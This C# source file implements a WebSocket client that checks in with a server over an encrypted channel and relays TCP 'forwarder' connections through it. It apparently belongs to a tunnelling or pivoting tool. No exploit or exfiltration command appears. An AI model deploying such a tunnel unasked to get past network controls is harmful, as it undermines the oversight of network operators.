using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;

namespace MessengerClient
{
    public class WebSocketMessengerClient : MessengerClient
    {
        private readonly Uri _uri;
        private readonly byte[] _encryptionKey;
        private readonly string _userAgent;
        private readonly double _retryDuration;
        private readonly int _retryAttempts;
        private readonly IWebProxy _proxy;
        private ClientWebSocket _webSocket;
        private readonly ConcurrentQueue<object> _downstreamMessages;
        private string _messengerId;
        private CancellationTokenSource _cancellationTokenSource;

        public WebSocketMessengerClient(string uri, byte[] encryptionKey, string userAgent, double retryDuration, int retryAttempts, IWebProxy proxy = null)
        {
            _uri = new Uri(uri);
            _encryptionKey = encryptionKey;
            _userAgent = userAgent;
            _retryDuration = retryDuration;
            _retryAttempts = retryAttempts;
            _proxy = proxy;
            _webSocket = new ClientWebSocket();
            _downstreamMessages = new ConcurrentQueue<object>();
            _messengerId = String.Empty;
        }

        public override async Task ConnectAsync()
        {
            int retryDelay = (int)((_retryDuration / _retryAttempts) * 1000);
            int consecutiveFailures = 0;

            while (consecutiveFailures < _retryAttempts)
            {
                try
                {
                    _cancellationTokenSource?.Cancel();
                    _cancellationTokenSource?.Dispose();

                    _webSocket?.Dispose();
                    _webSocket = new ClientWebSocket();
                    if (_proxy != null)
                        _webSocket.Options.Proxy = _proxy;
                    Console.WriteLine("Connecting to WebSocket server...");
                    await _webSocket.ConnectAsync(_uri, CancellationToken.None);
                    Console.WriteLine("Connected!");

                    var checkIn = new CheckInMessage(_messengerId);
                    var content = new ArraySegment<byte>(SerializeMessages(_encryptionKey, new List<object> { checkIn }));
                    await _webSocket.SendAsync(content, WebSocketMessageType.Binary, true, CancellationToken.None);

                    if (string.IsNullOrEmpty(_messengerId))
                    {
                        var ms = new MemoryStream();
                        var buffer = new byte[4096];
                        WebSocketReceiveResult result;
                        do
                        {
                            result = await _webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                            if (result.MessageType == WebSocketMessageType.Close)
                                throw new WebSocketException("Server closed during check-in");
                            ms.Write(buffer, 0, result.Count);
                        } while (!result.EndOfMessage);

                        byte[] messageData = ms.ToArray();
                        ms.Dispose();

                        var responseMessages = DeserializeMessages(_encryptionKey, messageData);

                        if (responseMessages[0] is CheckInMessage responseCheckIn)
                        {
                            _messengerId = responseCheckIn.MessengerId;
                            Console.WriteLine($"[*] Messenger ID received: {_messengerId}");
                        }
                        else
                        {
                            throw new Exception("Expected CheckInMessage from server");
                        }
                    }

                    _cancellationTokenSource = new CancellationTokenSource();
                    var receivingTask = ReceiveMessagesAsync();
                    var sendingTask = SendMessagesAsync(_cancellationTokenSource.Token);

                    await Task.WhenAll(receivingTask, sendingTask);
                    consecutiveFailures = 0;
                }
                catch (Exception ex)
                {
                    consecutiveFailures++;
                    Console.WriteLine($"[!] WebSocket connection failed: {ex.Message}");
                    if (consecutiveFailures < _retryAttempts)
                    {
                        Console.WriteLine("[*] Retrying connection...");
                        await Task.Delay(retryDelay);
                    }
                }
            }

            Console.WriteLine($"[-] Reconnect failed after {_retryAttempts} attempts. Giving up.");
        }


        private async Task ReceiveMessagesAsync()
        {
            var buffer = new byte[4096];
            var messageBuffer = new MemoryStream();

            while (_webSocket.State == WebSocketState.Open)
            {
                try
                {
                    var result = await _webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        Console.WriteLine("WebSocket connection closed.");
                        break;
                    }

                    messageBuffer.Write(buffer, 0, result.Count);

                    if (result.EndOfMessage)
                    {
                        byte[] messageData = messageBuffer.ToArray();
                        messageBuffer.SetLength(0);

                        try
                        {
                            var messages = DeserializeMessages(_encryptionKey, messageData);

                            foreach (var message in messages)
                            {
                                _ = Task.Run(async () =>
                                {
                                    await HandleMessageAsync(message);
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error parsing message: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error receiving message: {ex.Message}");
                    break;
                }
            }
        }

        public override async Task HandleMessageAsync(object message)
        {
            switch (message)
            {
                case InitiateForwarderClientReq reqMessage:
                    await HandleInitiateForwarderClientReqAsync(reqMessage);
                    break;

                case InitiateForwarderClientRep repMessage:
                    if (!ForwarderClients.TryGetValue(repMessage.ForwarderClientId, out var repClient))
                        break;
                    if (repMessage.Reason != 0)
                    {
                        if (ForwarderClients.TryRemove(repMessage.ForwarderClientId, out var denied))
                            denied.Close();
                        break;
                    }
                    await StreamAsync(repMessage.ForwarderClientId);
                    break;

                case SendDataMessage sendDataMessage:
                    if (sendDataMessage.Data.Length == 0)
                    {
                        if (ForwarderClients.TryRemove(sendDataMessage.ForwarderClientId, out var closedClient))
                            closedClient.Close();
                    }
                    else if (ForwarderClients.TryGetValue(sendDataMessage.ForwarderClientId, out var client))
                    {
                        await client.GetStream().WriteAsync(sendDataMessage.Data, 0, sendDataMessage.Data.Length);
                    }
                    break;

                case CheckInMessage checkInMessage:
                    _messengerId = checkInMessage.MessengerId;
                    break;

                default:
                    Console.WriteLine("Unknown message type received");
                    break;
            }
        }

        public override Task SendDownstreamMessageAsync(object message)
        {
            _downstreamMessages.Enqueue(message);
            return Task.CompletedTask;
        }

        private async Task SendMessagesAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested && _webSocket.State == WebSocketState.Open)
            {
                if (_downstreamMessages.IsEmpty)
                {
                    await Task.Delay(10, token);
                    continue;
                }

                var downstreamMessages = new List<object>{ new CheckInMessage(_messengerId) };

                while (_downstreamMessages.TryDequeue(out var message))
                {
                    downstreamMessages.Add(message);
                }

                var content = new ArraySegment<byte>(SerializeMessages(_encryptionKey, downstreamMessages));
                await _webSocket.SendAsync(content, WebSocketMessageType.Binary, true, token);
            }
        }

        public async Task CloseAsync()
        {
            if (_webSocket.State == WebSocketState.Open)
            {
                await _webSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing connection", CancellationToken.None);
                Console.WriteLine("WebSocket connection closed.");
            }
        }
    }
}
